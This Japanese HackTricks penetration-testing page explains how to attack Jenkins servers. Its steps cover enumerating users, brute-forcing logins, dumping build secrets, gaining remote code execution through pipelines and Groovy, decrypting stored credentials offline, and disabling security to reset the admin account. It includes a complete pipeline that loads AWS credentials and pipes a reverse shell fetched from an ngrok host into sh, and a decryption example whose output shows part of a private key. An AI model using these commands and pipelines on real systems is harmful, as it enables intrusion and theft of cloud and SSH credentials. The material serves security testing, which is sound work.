# Jenkinsセキュリティ

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する
- **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください**

</details>

## 基本情報

Jenkinsは、パイプラインを使用して、**プログラミング言語**と**ソースコードリポジトリ**のほぼ**すべての組み合わせ**に対して**継続的インテグレーション**または**継続的デリバリー**（CI/CD）環境を確立するための簡単な方法を提供するツールです。さらに、さまざまな開発タスクを自動化します。Jenkinsは**個々のステップのスクリプトを作成する必要性を排除**するわけではありませんが、ビルド、テスト、展開ツールの全シーケンスを手動で簡単に構築できる方法よりも迅速かつ堅牢な統合方法を提供します。

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 認証されていない列挙

認証なしで興味深いJenkinsページを検索するために（_ /people _または_ /asynchPeople _のような、現在のユーザーをリストアップするページなど）、次のように使用できます：
```
msf> use auxiliary/scanner/http/jenkins_enum
```
認証なしでコマンドを実行できるかどうかを確認します：
```
msf> use auxiliary/scanner/http/jenkins_command
```
認証情報がなくても、_**/asynchPeople/**_ パスや _**/securityRealm/user/admin/search/index?q=**_ で **ユーザー名** を見ることができます。

Jenkins バージョンを _**/oops**_ または _**/error**_ パスから取得できるかもしれません。

![](<../../.gitbook/assets/image (146).png>)

### 既知の脆弱性

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ログイン

基本情報では、**Jenkins にログインする方法すべて** を確認できます:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 登録

Jenkins インスタンスを見つけることができ、**アカウントを作成してログイン** できるものがあります。それほど簡単です。

### **SSO ログイン**

また、**SSO 機能**/**プラグイン** が存在する場合は、テストアカウント（つまり、テスト **Github/Bitbucket アカウント**）を使用してアプリケーションに **ログイン** を試みる必要があります。[**こちら**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/) のトリック。

### ブルートフォース

**Jenkins** には **パスワードポリシー** や **ユーザー名のブルートフォース対策** が欠けています。**弱いパスワード** や **ユーザー名をパスワードとして使用** している可能性があるため、ユーザーを **ブルートフォース** することが重要です。**逆のユーザー名をパスワードとして使用** している場合もあります。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### パスワードスプレー

[このPythonスクリプト](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py)または[このPowerShellスクリプト](https://github.com/chryzsh/JenkinsPasswordSpray)を使用します。

### IPホワイトリスト回避

多くの組織は、GitHubやGitLabなどの**SaaSベースのソースコントロール管理（SCM）システム**を**内部の自己ホスト型CI**ソリューション（JenkinsやTeamCityなど）と組み合わせています。このセットアップにより、CIシステムは主にパイプラインジョブをトリガーするために**SaaSソースコントロールベンダーからWebhookイベントを受信**できます。

これを実現するために、組織は**SCMプラットフォームのIP範囲をホワイトリスト**に登録し、**Webhook**を介して**内部CIシステム**にアクセスできるようにします。ただし、重要な点として、**誰でも**GitHubやGitLabでアカウントを作成し、**Webhookをトリガー**するように構成でき、内部CIシステムにリクエストを送信する可能性があることに注意する必要があります。

確認: [shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## 内部Jenkinsの悪用

これらのシナリオでは、Jenkinsにアクセスするための有効なアカウントがあると仮定します。

{% hint style="warning" %}
Jenkinsで構成された**認証**メカニズムと、侵害されたユーザーの**権限**に応じて、以下の攻撃を実行できるかどうかが異なる場合があります。
{% endhint %}

詳細については、基本情報を確認してください:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ユーザーのリスト表示

Jenkinsにアクセスできる場合、他の登録ユーザーを[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)でリスト表示できます。

### クリアテキストの秘密を見つけるためのビルドのダンプ

[このスクリプト](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py)を使用して、ビルドコンソール出力とビルド環境変数をダンプして、クリアテキストの秘密を見つけることができます。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH資格情報の盗難**

**侵害されたユーザーが新しいJenkinsノードを作成/変更する権限を持っている**場合、既に他のノードにアクセスするためのSSH資格情報が格納されている場合、ノードを作成/変更して**ホストキーを検証せずに資格情報を記録するホストを設定**することで、その資格情報を**盗む**ことができます：

![](<../../.gitbook/assets/image (218).png>)

通常、JenkinsのSSH資格情報は**グローバルプロバイダー**（`/credentials/`）にありますので、他の秘密情報をダンプするのと同様にそれらをダンプすることもできます。詳細は[**秘密情報のダンプセクション**](./#dumping-secrets)を参照してください。

### **JenkinsでのRCE**

Jenkinsサーバーで**シェルを取得**すると、攻撃者はすべての**秘密情報**と**環境変数**を漏洩させ、同じネットワーク内にある他のマシンを**悪用**したり、さらには**クラウド資格情報を収集**する機会を得ます。

デフォルトでは、Jenkinsは**SYSTEMとして実行**されます。したがって、それを侵害すると、攻撃者は**SYSTEM権限**を取得します。

### **プロジェクトの作成/変更によるRCE**

プロジェクトの作成/変更は、Jenkinsサーバー上でRCEを取得する方法の1つです：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovyスクリプトの実行によるRCE**

新しいプロジェクトを作成するよりも**ステルス性が高い**Groovyスクリプトを実行することで、RCEを取得することもできます：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### パイプラインの作成/変更によるRCE

**パイプラインの作成/変更**によっても**RCEを取得**することができます：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## パイプラインの悪用

パイプラインを悪用するには、引き続きJenkinsへのアクセスが必要です。

### ビルドパイプライン

**パイプライン**は、プロジェクトでの**ビルドメカニズムとして使用**することもできます。その場合、パイプライン構文を含む**リポジトリ内のファイル**を構成できます。デフォルトでは`/Jenkinsfile`が使用されます：

![](<../../.gitbook/assets/image (127).png>)

リポジトリ内のファイルに**パイプライン構成ファイルを保存**することも可能です（たとえば、他のリポジトリに）。これにより、リポジトリの**アクセス**とパイプラインのアクセスを**分離**することができます。

攻撃者がそのファイルに**書き込みアクセス**を持っている場合、それを**変更**してパイプラインを**トリガー**することができ、Jenkinsへのアクセスがなくてもパイプラインを実行できます。\
攻撃者は**一部のブランチ保護をバイパスする必要がある**場合があります（プラットフォームとユーザー権限によってはバイパスできる場合もあります）。

カスタムパイプラインを実行する最も一般的なトリガーは次のとおりです：

* メインブランチへの**プルリクエスト**（または他のブランチへの可能性があります）
* メインブランチへの**プッシュ**（または他のブランチへの可能性があります）
* メインブランチを**更新**して、何らかの方法で実行が完了するのを待つ

{% hint style="info" %}
**外部ユーザー**の場合、**他のユーザー/組織のリポジトリのメインブランチにPRを作成**して**パイプラインをトリガー**することは期待しないでください... ただし、**悪く構成されている**場合、これを**悪用することで企業を完全に侵害**することができます。
{% endhint %}

### パイプラインRCE

以前のRCEセクションでは、[**パイプラインを変更してRCEを取得**するテクニック](./#rce-creating-modifying-pipeline)がすでに示されています。

### 環境変数の確認

パイプライン全体または特定のステージのために**クリアテキスト環境変数**を宣言することができます。これらの環境変数には**機密情報が含まれていない**はずですが、攻撃者は常に**すべてのパイプライン**構成/Jenkinsfileを確認できます：
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### シークレットのダンプ

Jenkinsでのシークレットの扱い方についての詳細は、基本情報を参照してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

資格情報は、**グローバルプロバイダ** (`/credentials/`) または**特定のプロジェクト** (`/job/<project-name>/configure`) にスコープを設定できます。したがって、すべてのシークレットを外部に流出させるには、シークレットを含むすべてのプロジェクトを少なくとも**すべて侵害**し、カスタム/毒入りのパイプラインを実行する必要があります。

別の問題があります。パイプラインの**環境内のシークレット**を取得するには、**シークレットの名前とタイプを知る必要があります**。たとえば、**`usernamePassword`** **シークレット**を**`string`** **シークレット**として**ロード**しようとすると、この**エラー**が発生します：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
以下は一般的な秘密タイプをロードする方法です：
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
このページの最後に、**すべての資格情報タイプ**を見つけることができます: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**すべての秘密情報を一度にダンプする**最良の方法は、**Jenkins**マシンを**侵害**して（たとえば**組み込みノード**に逆シェルを実行して）、その後**マスターキー**と**暗号化された秘密情報**を**漏洩**し、オフラインでそれらを復号化することです。\
これについて詳しくは、[Nodes & Agentsセクション](./#nodes-and-agents)および[Post Exploitationセクション](./#post-exploitation)を参照してください。
{% endhint %}

### トリガー

[ドキュメント](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)によると、`triggers`ディレクティブは、**Pipelineを再トリガーする自動化された方法**を定義します。GitHubやBitBucketなどのソースと統合されたPipelineの場合、`triggers`は必要ないかもしれません。ウェブフックベースの統合がすでに存在する可能性があります。現在利用可能なトリガーは`cron`、`pollSCM`、`upstream`です。

Cronの例:
```bash
triggers { cron('H */4 * * 1-5') }
```
**ドキュメントの他の例**を確認してください。

### ノードとエージェント

**Jenkinsインスタンス**には**異なるマシンで実行されている異なるエージェント**があるかもしれません。攻撃者の観点からは、異なるマシンへのアクセスは盗む**異なる潜在的なクラウド資格情報**または他のマシンを悪用するために悪用できる**異なるネットワークアクセス**を意味します。

詳細については、基本情報を確認してください：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

`/computer/` で**構成されたノード**を列挙できます。通常、\*\*`Built-In Node` \*\*（Jenkinsを実行しているノード）とその他のノードが見つかります：

![](<../../.gitbook/assets/image (249).png>)

**Built-Inノードを侵害することが特に興味深い**です。なぜなら、それには機密性の高いJenkins情報が含まれているからです。

**パイプラインを****ビルトインJenkinsノードで実行**することを示すには、パイプライン内で次の構成を指定できます：
```bash
pipeline {
agent {label 'built-in'}
```
### 完全な例

特定のエージェントでのパイプライン、cron トリガー、パイプラインとステージの環境変数を使用し、ステップで 2 つの変数を読み込んでリバースシェルを送信します。
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## ポストエクスプロイテーション

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkinsの秘密

十分な権限があれば、`/credentials/` にアクセスして秘密をリストアップできます。ただし、これは `credentials.xml` ファイル内の秘密のみをリストアップしますが、**ビルド構成ファイル**には**さらに多くの資格情報**が含まれている可能性があります。

各プロジェクトの構成を見ることができれば、そこにはリポジトリにアクセスするために使用される**資格情報（秘密）**の名前や、プロジェクトの**他の資格情報**も表示されます。

![](<../../.gitbook/assets/image (180).png>)

#### Groovyから

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### ディスクから

これらのファイルは、Jenkinsの秘密を**復号化するために必要です**:

* secrets/master.key
* secrets/hudson.util.Secret

このような**秘密は通常**以下で見つけることができます:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

これを見つけるための正規表現は次のとおりです:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkinsの秘密をオフラインで復号化する

必要なパスワードをダンプした場合は、[**このスクリプト**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py)を使用して、それらの秘密を復号化します。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### GroovyからJenkinsの秘密を復号化
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 新しい管理者ユーザーの作成

1. `/var/lib/jenkins/config.xml`または`C:\Program Files (x86)\Jenkis\`内のJenkinsのconfig.xmlファイルにアクセスします。
2. `<useSecurity>true</useSecurity>`という単語を検索し、**`true`**を**`false`**に変更します。
3. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`を実行します。
4. **Jenkins**サーバーを**再起動**します：`service jenkins restart`
5. Jenkinsポータルに再度アクセスし、今回は**Jenkinsが資格情報を要求しない**ことを確認します。**"Manage Jenkins"**に移動して**管理者パスワードを再設定**します。
6. 設定を`<useSecurity>true</useSecurity>`に変更して**セキュリティを再度有効化**し、**Jenkinsを再起動**します。

## 参考文献

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)
